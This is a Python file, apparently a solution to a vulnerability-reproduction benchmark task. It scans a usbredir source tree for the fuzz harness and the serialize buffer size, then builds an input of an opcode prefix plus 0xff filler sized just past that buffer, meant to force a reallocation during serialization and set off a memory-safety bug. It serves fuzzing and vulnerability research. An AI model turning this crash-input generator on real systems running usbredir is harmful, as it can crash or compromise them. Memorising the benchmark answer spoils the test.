import os
import re
import tarfile
import tempfile
import shutil
import ast
from typing import Iterator, Tuple, Optional, Dict, Any


def _iter_source_files_from_dir(root: str) -> Iterator[Tuple[str, bytes]]:
    for base, _, files in os.walk(root):
        for fn in files:
            lp = os.path.join(base, fn)
            rel = os.path.relpath(lp, root)
            try:
                with open(lp, "rb") as f:
                    yield rel, f.read()
            except Exception:
                continue


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_source_files_from_dir(src_path)
        return

    if tarfile.is_tarfile(src_path):
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    yield name, f.read()
                except Exception:
                    continue
        return

    # Fallback: treat as file containing sources? none
    return


def _to_text(b: bytes, limit: int = 2_000_000) -> str:
    if len(b) > limit:
        b = b[:limit]
    return b.decode("utf-8", errors="ignore")


_num_suffix_re = re.compile(r"(?P<num>0x[0-9a-fA-F]+|\d+)(?P<suf>[uUlL]+)?")


def _strip_num_suffixes(expr: str) -> str:
    def repl(m: re.Match) -> str:
        return m.group("num")
    return _num_suffix_re.sub(repl, expr)


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("_names",)

    def __init__(self, names: Dict[str, int]):
        self._names = names

    def visit(self, node):
        return super().visit(node)

    def visit_Expression(self, node: ast.Expression) -> int:
        return self.visit(node.body)

    def visit_Constant(self, node: ast.Constant) -> int:
        if isinstance(node.value, bool) or not isinstance(node.value, (int, float)):
            raise ValueError("bad constant")
        return int(node.value)

    def visit_Name(self, node: ast.Name) -> int:
        if node.id in self._names:
            return int(self._names[node.id])
        raise ValueError("unknown name")

    def visit_UnaryOp(self, node: ast.UnaryOp) -> int:
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary")

    def visit_BinOp(self, node: ast.BinOp) -> int:
        a = self.visit(node.left)
        b = self.visit(node.right)
        op = node.op
        if isinstance(op, ast.Add):
            return a + b
        if isinstance(op, ast.Sub):
            return a - b
        if isinstance(op, ast.Mult):
            return a * b
        if isinstance(op, (ast.Div, ast.FloorDiv)):
            if b == 0:
                raise ValueError("div0")
            return a // b
        if isinstance(op, ast.Mod):
            if b == 0:
                raise ValueError("mod0")
            return a % b
        if isinstance(op, ast.LShift):
            return a << b
        if isinstance(op, ast.RShift):
            return a >> b
        if isinstance(op, ast.BitOr):
            return a | b
        if isinstance(op, ast.BitAnd):
            return a & b
        if isinstance(op, ast.BitXor):
            return a ^ b
        raise ValueError("bad binop")

    def visit_Call(self, node: ast.Call) -> int:
        raise ValueError("call not allowed")

    def visit_IfExp(self, node: ast.IfExp) -> int:
        raise ValueError("ifexp not allowed")

    def generic_visit(self, node) -> int:
        raise ValueError(f"bad node {type(node).__name__}")


def _safe_eval_int(expr: str, names: Optional[Dict[str, int]] = None) -> Optional[int]:
    if names is None:
        names = {}
    try:
        expr = expr.strip()
        expr = _strip_num_suffixes(expr)
        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S)
        expr = re.sub(r"//.*", "", expr)
        expr = expr.strip()
        if not expr:
            return None
        tree = ast.parse(expr, mode="eval")
        return int(_SafeEval(names).visit(tree))
    except Exception:
        return None


def _find_define_int(all_texts: Iterator[str], define_name: str) -> Optional[int]:
    pat = re.compile(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(define_name) + r"[ \t]+(.+?)\s*$", re.M)
    for txt in all_texts:
        m = pat.search(txt)
        if not m:
            continue
        rhs = m.group(1).strip()
        val = _safe_eval_int(rhs)
        if val is not None and val > 0:
            return val
    return None


def _brace_match(s: str, open_pos: int) -> Optional[int]:
    if open_pos < 0 or open_pos >= len(s) or s[open_pos] != "{":
        return None
    depth = 0
    for i in range(open_pos, len(s)):
        c = s[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
    return None


def _pick_harness_text(texts_by_path: Dict[str, str]) -> Optional[str]:
    candidates = []
    for p, t in texts_by_path.items():
        if ("LLVMFuzzerTestOneInput" in t) or ("FuzzerTestOneInput" in t):
            if ("usbredirparser" in t) or ("USBREDIR" in t):
                score = 0
                if "usbredirparser_serialize" in t or "serialize_data" in t:
                    score += 3
                if "usbredirparser_send_" in t:
                    score += 2
                if "FuzzedDataProvider" in t:
                    score += 1
                candidates.append((score, p, t))
    if not candidates:
        for p, t in texts_by_path.items():
            if ("usbredirparser_serialize" in t or "serialize_data" in t) and ("usbredirparser" in t):
                candidates.append((1, p, t))
    if not candidates:
        return None
    candidates.sort(reverse=True, key=lambda x: (x[0], -len(x[2])))
    return candidates[0][2]


def _extract_min_size_check(harness: str) -> int:
    max_n = 0
    for m in re.finditer(r"\bif\s*\(\s*(?:Size|size)\s*<\s*([0-9]+)\s*\)", harness):
        try:
            n = int(m.group(1))
            if n > max_n:
                max_n = n
        except Exception:
            continue
    return max_n


def _type_width(t: str) -> int:
    t = t.strip()
    t = re.sub(r"\bconst\b", "", t)
    t = re.sub(r"\bunsigned\b", "unsigned", t)
    t = re.sub(r"\s+", " ", t).strip()
    if "uint8_t" in t or t in ("char", "signed char", "unsigned char", "uint8", "u8"):
        return 1
    if "uint16_t" in t or t in ("short", "unsigned short", "uint16", "u16"):
        return 2
    if "uint32_t" in t or "int32_t" in t or t in ("int", "unsigned", "unsigned int", "uint32", "u32", "int32"):
        return 4
    if "uint64_t" in t or "int64_t" in t or "size_t" in t or t in ("long long", "unsigned long long", "unsigned long", "long"):
        return 8
    return 4


def _find_send_case_op(harness: str) -> Optional[Dict[str, Any]]:
    # Find a switch that uses ConsumeIntegralInRange and contains usbredirparser_send_ in a case
    sw_re = re.compile(
        r"switch\s*\(\s*[^)]*ConsumeIntegralInRange\s*<\s*([^>]+?)\s*>\s*\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\)\s*[^)]*\)",
        re.S,
    )
    m = sw_re.search(harness)
    if not m:
        return None
    ttype = m.group(1).strip()
    rmin_s = m.group(2).strip()
    rmax_s = m.group(3).strip()
    rmin = _safe_eval_int(rmin_s)
    rmax = _safe_eval_int(rmax_s)
    if rmin is None or rmax is None:
        return None
    sw_start = m.end()
    brace_open = harness.find("{", sw_start)
    if brace_open < 0:
        return None
    brace_close = _brace_match(harness, brace_open)
    if brace_close is None:
        return None
    block = harness[brace_open + 1: brace_close]

    case_iter = list(re.finditer(r"\bcase\s+([0-9]+)\s*:", block))
    if not case_iter:
        return None

    chosen = None
    for i, cm in enumerate(case_iter):
        op = int(cm.group(1))
        start = cm.end()
        end = case_iter[i + 1].start() if i + 1 < len(case_iter) else len(block)
        cblk = block[start:end]
        if "usbredirparser_send_bulk" in cblk:
            chosen = {"op": op, "ttype": ttype, "rmin": rmin, "rmax": rmax}
            break

    if chosen is None:
        for i, cm in enumerate(case_iter):
            op = int(cm.group(1))
            start = cm.end()
            end = case_iter[i + 1].start() if i + 1 < len(case_iter) else len(block)
            cblk = block[start:end]
            if "usbredirparser_send_" in cblk:
                chosen = {"op": op, "ttype": ttype, "rmin": rmin, "rmax": rmax}
                break

    return chosen


def _make_prefix_from_op(info: Dict[str, Any]) -> bytes:
    op = int(info["op"])
    rmin = int(info["rmin"])
    rmax = int(info["rmax"])
    if rmax < rmin:
        rmin, rmax = rmax, rmin
    rng = (rmax - rmin) + 1
    desired = op
    if desired < rmin or desired > rmax or rng <= 0:
        return b""
    raw = (desired - rmin) % rng
    width = _type_width(str(info.get("ttype", "int")))
    return int(raw).to_bytes(width, "little", signed=False)


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts_by_path: Dict[str, str] = {}
        all_texts = []
        for p, b in _iter_source_files(src_path):
            if not any(p.lower().endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")):
                continue
            t = _to_text(b)
            texts_by_path[p] = t
            all_texts.append(t)

        bufsize = _find_define_int(iter(all_texts), "USBREDIRPARSER_SERIALIZE_BUF_SIZE")
        if bufsize is None:
            bufsize = 64 * 1024

        harness = _pick_harness_text(texts_by_path) or ""
        min_check = _extract_min_size_check(harness)

        prefix = b"\x01"
        opinfo = None
        if harness:
            opinfo = _find_send_case_op(harness)
        if opinfo:
            pfx = _make_prefix_from_op(opinfo)
            if pfx:
                prefix = pfx

        # Choose a size just over the serialize buffer size to force reallocation during write-buf serialization
        # while remaining relatively small for scoring.
        total_len = bufsize + 1024
        if total_len < 66000:
            total_len = 66000
        if total_len <= min_check:
            total_len = min_check + 1
        if total_len < len(prefix) + 1:
            total_len = len(prefix) + 1

        filler_len = total_len - len(prefix)
        return prefix + (b"\xff" * filler_len)